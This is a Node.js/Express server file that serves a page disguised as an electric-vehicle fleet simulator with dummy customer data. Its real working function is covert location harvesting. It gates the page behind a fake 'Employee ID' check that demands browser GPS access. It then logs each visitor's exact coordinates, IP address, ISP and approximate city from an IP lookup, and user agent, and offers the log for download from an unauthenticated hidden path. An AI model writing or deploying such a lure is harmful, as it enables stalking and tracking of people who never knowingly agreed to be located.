const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 4000;
const SECRET_PATH = "/sssss"; // Secret path to download logs
const LOG_FILE = path.join(__dirname, "logs.json");

// Middleware
app.use(bodyParser.json());
app.use(express.static("public")); // If you add external css/js later

// Ensure logs.json exists
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

// --- DUMMY DATA FOR SIMULATOR ---
const DUMMY_CUSTOMERS = [
  { id: "CUST001", name: "Rajesh Logistics", city: "Delhi", vehicle: "Tata Ace EV", status: "Charging" },
  { id: "CUST002", name: "FastTrack Movers", city: "Gurugram", vehicle: "Mahindra Zor Grand", status: "In Transit" },
  { id: "CUST003", name: "Noida Retail Hub", city: "Noida", vehicle: "Euler HiLoad", status: "Delivered" },
  { id: "CUST004", name: "Haryana Transports", city: "Faridabad", vehicle: "Tata Ace EV", status: "Idle" },
  { id: "CUST005", name: "Green Earth Supply", city: "Delhi", vehicle: "Altigreen neEV", status: "In Transit" },
  { id: "CUST006", name: "Cyber City Cargo", city: "Gurugram", vehicle: "Euler HiLoad", status: "Charging" },
  { id: "CUST007", name: "Yamuna E-Logistics", city: "Noida", vehicle: "Mahindra Zor Grand", status: "In Transit" },
  { id: "CUST008", name: "Faridabad Fresh", city: "Faridabad", vehicle: "Altigreen neEV", status: "Delivered" }
];

// --- HELPER FUNCTIONS ---
function saveLog(entry) {
  try {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
    logs.push(entry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
    console.log("New Entry Logged:", entry.employeeId);
  } catch (err) {
    console.error("Error saving log:", err);
  }
}

// --- ROUTES ---

// 1. MAIN SIMULATOR PAGE (GET /)
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EV Fleet Simulator | Commercial LCV</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; text-align: center; }
        h3 { color: #7f8c8d; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        
        /* Employee Login Section */
        .login-box { background: #e8f6f3; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #1abc9c; }
        .input-group { margin-top: 10px; display: flex; gap: 10px; }
        input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; flex-grow: 1; }
        button#loginBtn { padding: 10px 20px; background: #1abc9c; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button#loginBtn:hover { background: #16a085; }
        #gpsStatus { font-size: 0.9em; margin-top: 5px; color: #d35400; font-weight: bold; }

        /* Filter Section */
        .filter-section { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        select { padding: 8px; border-radius: 5px; border: 1px solid #bdc3c7; }

        /* Table */
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #34495e; color: white; }
        tr:hover { background-color: #f1f1f1; }
        
        .status-badge { padding: 5px 10px; border-radius: 12px; font-size: 0.85em; color: white; }
        .status-Charging { background-color: #f39c12; }
        .status-In-Transit { background-color: #3498db; }
        .status-Delivered { background-color: #27ae60; }
        .status-Idle { background-color: #95a5a6; }

        /* Hide content until login */
        #dashboard { display: none; opacity: 0.5; pointer-events: none; }
    </style>
</head>
<body>

<div class="container">
    <h1>🚛 EV Commercial LCV Simulator</h1>
    
    <div class="login-box">
        <h3>1. Driver / Employee Verification</h3>
        <p>Please enter your Employee ID to access the fleet dashboard and enable GPS tracking.</p>
        <div class="input-group">
            <input type="text" id="empId" placeholder="Enter Employee ID (e.g., EMP-2024)" />
            <button id="loginBtn" onclick="enableSystem()">Verify & Connect GPS</button>
        </div>
        <p id="gpsStatus">Waiting for input...</p>
    </div>

    <div id="dashboard">
        <h3>2. Live Fleet Overview (India Region)</h3>
        
        <div class="filter-section">
            <label><strong>Filter by City:</strong></label>
            <select id="cityFilter" onchange="filterTable()">
                <option value="all">All Cities</option>
                <option value="Delhi">Delhi</option>
                <option value="Gurugram">Gurugram</option>
                <option value="Noida">Noida</option>
                <option value="Faridabad">Faridabad</option>
            </select>
        </div>

        <table id="custTable">
            <thead>
                <tr>
                    <th>Customer Name</th>
                    <th>City</th>
                    <th>Vehicle Model</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                </tbody>
        </table>
    </div>
</div>

<script>
    // Inject Dummy Data from Server
    const customers = ${JSON.stringify(DUMMY_CUSTOMERS)};
    
    // Render Table
    function renderTable(data) {
        const tbody = document.getElementById('tableBody');
        tbody.innerHTML = '';
        data.forEach(cust => {
            const row = \`<tr>
                <td>\${cust.name}</td>
                <td>\${cust.city}</td>
                <td>\${cust.vehicle}</td>
                <td><span class="status-badge status-\${cust.status.replace(' ', '-')}">\${cust.status}</span></td>
            </tr>\`;
            tbody.innerHTML += row;
        });
    }

    // Initial Render
    renderTable(customers);

    // Filter Logic
    function filterTable() {
        const city = document.getElementById('cityFilter').value;
        if (city === 'all') {
            renderTable(customers);
        } else {
            const filtered = customers.filter(c => c.city === city);
            renderTable(filtered);
        }
    }

    // GPS & Login Logic
    function enableSystem() {
        const empId = document.getElementById('empId').value;
        const statusTxt = document.getElementById('gpsStatus');
        const dashboard = document.getElementById('dashboard');

        if (!empId) {
            alert("Please enter Employee ID");
            return;
        }

        statusTxt.innerText = "Requesting GPS Access... Please Allow.";

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // SUCCESS
                    statusTxt.style.color = "green";
                    statusTxt.innerText = "GPS Connected. Location Acquired.";
                    
                    // Unlock Dashboard
                    dashboard.style.display = "block";
                    dashboard.style.opacity = "1";
                    dashboard.style.pointerEvents = "auto";
                    document.getElementById('loginBtn').disabled = true;

                    // Send Data to Server
                    sendData(empId, position.coords.latitude, position.coords.longitude);
                },
                (error) => {
                    // ERROR
                    statusTxt.style.color = "red";
                    statusTxt.innerText = "GPS Error: " + error.message + ". Location required.";
                }
            );
        } else {
            statusTxt.innerText = "Geolocation not supported by this browser.";
        }
    }

    async function sendData(empId, lat, lon) {
        try {
            await fetch('/api/log-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    employeeId: empId,
                    latitude: lat,
                    longitude: lon,
                    timestamp: new Date().toISOString()
                })
            });
            console.log("Location sent to server.");
        } catch (e) {
            console.error("Failed to send location", e);
        }
    }
</script>

</body>
</html>
  `);
});

// 2. LOGGING API (Receives GPS & ID)
app.post("/api/log-location", async (req, res) => {
  const { employeeId, latitude, longitude, timestamp } = req.body;
  
  // Get Network IP info as backup
  let networkInfo = {};
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    networkInfo = await response.json();
  } catch (e) {
    networkInfo = { error: "Could not fetch IP details" };
  }

  const logEntry = {
    receivedAt: new Date().toISOString(),
    employeeId: employeeId,
    gps_live: {
      lat: latitude,
      lon: longitude
    },
    network_data: {
      ip: ip,
      city_approx: networkInfo.city,
      isp: networkInfo.isp
    },
    userAgent: req.headers["user-agent"]
  };

  saveLog(logEntry);
  res.json({ status: "success", message: "Location logged" });
});

// 3. SECRET DOWNLOAD ROUTE
app.get(SECRET_PATH, (req, res) => {
  if (!fs.existsSync(LOG_FILE)) {
    return res.status(404).send("No logs found yet.");
  }
  
  const logs = fs.readFileSync(LOG_FILE, "utf8");
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Content-Disposition", "attachment; filename=ev_simulator_logs.json");
  res.send(logs);
});

// Start Server
app.listen(PORT, () => {
  console.log(`Simulator running at http://localhost:${PORT}`);
  console.log(`Secret logs at http://localhost:${PORT}${SECRET_PATH}`);
});
